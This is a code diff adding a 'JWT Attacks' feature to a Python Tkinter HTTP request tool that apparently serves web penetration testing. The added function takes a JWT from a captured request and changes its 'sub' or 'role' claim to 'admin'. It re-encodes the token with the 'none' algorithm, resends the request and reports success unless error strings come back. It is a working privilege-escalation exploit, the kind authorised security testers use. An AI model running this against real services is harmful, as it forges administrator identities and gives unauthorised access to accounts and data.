@@ -7,6 +7,7 @@ import re
 import subprocess
 import os
 from urllib.parse import urlparse, parse_qs
+import base64
 
 class HTTPRequestTool:
     def __init__(self, root):
@@ -76,6 +77,10 @@ class HTTPRequestTool:
         # Send button
         self.send_button = ttk.Button(button_frame, text="Send Request", command=self.process_request)
         self.send_button.pack(side=tk.LEFT, padx=5)
+        
+        # JWT Attacks button
+        self.jwt_attacks_button = ttk.Button(button_frame, text="JWT Attacks", command=self.show_jwt_attacks_menu)
+        self.jwt_attacks_button.pack(side=tk.LEFT, padx=5)
         
         # Clickjack button
         self.clickjack_button = ttk.Button(button_frame, text="Generate Clickjack", command=self.generate_clickjack)
@@ -291,6 +296,79 @@ class HTTPRequestTool:
             self.jwt_text.pack_forget()
         else:
             self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
+
+    def show_jwt_attacks_menu(self):
+        # Create a new window for JWT attacks
+        attack_window = tk.Toplevel(self.root)
+        attack_window.title("JWT Attacks")
+        attack_window.geometry("400x300")
+        
+        # Create a frame for attack options
+        attack_frame = ttk.Frame(attack_window)
+        attack_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
+        
+        # Add attack options
+        self.unverified_sig_var = tk.BooleanVar()
+        ttk.Checkbutton(attack_frame, text="Unverified Signature Attack", variable=self.unverified_sig_var).pack(anchor=tk.W, pady=5)
+        
+        # Add run button
+        ttk.Button(attack_frame, text="Run Selected Attacks", command=lambda: self.run_jwt_attacks(attack_window)).pack(pady=10)
+
+    def run_jwt_attacks(self, attack_window):
+        if self.unverified_sig_var.get():
+            self.perform_unverified_signature_attack()
+        attack_window.destroy()
+
+    def perform_unverified_signature_attack(self):
+        # Get the current request text
+        request_text = self.request_text.get("1.0", tk.END).strip()
+        
+        # Find JWT tokens in the request
+        jwt_tokens = self.find_jwt(request_text)
+        if not jwt_tokens:
+            messagebox.showerror("Error", "No JWT tokens found in request")
+            return
+        
+        # Get the first JWT token
+        original_token = jwt_tokens[0]
+        
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(original_token)
+            payload = jwt.decode(original_token, options={"verify_signature": False})
+            
+            # Modify a value in the payload (e.g., change 'sub' to 'admin' if it exists)
+            if 'sub' in payload:
+                payload['sub'] = 'admin'
+            elif 'role' in payload:
+                payload['role'] = 'admin'
+            else:
+                # If no obvious fields to modify, add a new one
+                payload['modified'] = 'true'
+            
+            # Create a new token with the modified payload
+            # We don't need to sign it since we're testing unverified signature
+            modified_token = jwt.encode(payload, "", algorithm="none")
+            
+            # Replace the original token in the request
+            modified_request = request_text.replace(original_token, modified_token)
+            
+            # Send the modified request
+            self.request_text.delete("1.0", tk.END)
+            self.request_text.insert("1.0", modified_request)
+            self.process_request()
+            
+            # Check the response for failure indicators
+            response_text = self.response_text.get("1.0", tk.END).lower()
+            failure_indicators = ['jwt expired', 'jwt invalid', 'invalid signature', 'invalid token']
+            
+            if any(indicator in response_text for indicator in failure_indicators):
+                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ❌ FAILED")
+            else:
+                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ✅ SUCCESS")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")
 
 def main():
     root = tk.Tk()
